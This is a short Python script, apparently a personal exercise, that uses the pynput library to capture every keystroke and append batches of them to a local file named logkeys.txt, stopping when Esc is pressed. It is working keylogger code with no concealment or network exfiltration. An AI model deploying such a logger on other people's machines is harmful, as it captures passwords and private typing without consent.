# -*- coding: utf-8 -*-
"""
Created on Mon Aug 30 13:52:40 2021

@author: mouni
"""

import pynput
from pynput.keyboard import Key, Listener
import time

keys = []
count = 0

def on_press(key):
    global count, keys
    keys.append(key)
    count +=1
    if count>12:
        logs = open(r'C:\Users\mouni\Downloads\logkeys.txt','a')
        logs.write(str(keys))
        count =0
        keys = []
    print(key)

    
def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
   
    
    